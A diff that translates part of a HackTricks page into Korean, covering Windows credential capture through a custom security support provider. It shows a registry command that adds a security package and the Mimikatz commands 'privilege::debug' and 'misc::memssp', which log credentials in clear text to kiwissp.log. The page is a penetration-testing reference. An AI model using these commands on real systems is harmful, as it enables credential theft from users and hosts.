@@ -39,11 +39,11 @@ Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`
+그리고 재부팅 후 모든 자격 증명은 `C:\Windows\System32\kiwissp.log`에서 평문으로 찾을 수 있습니다.
 
-#### In memory
+#### 메모리 내
 
-You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
+Mimikatz를 사용하여 메모리에 직접 주입할 수도 있습니다(약간 불안정하거나 작동하지 않을 수 있습니다).
 ```powershell
 privilege::debug
 misc::memssp
@@ -64,7 +64,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
 
 </details>
 {% endhint %}
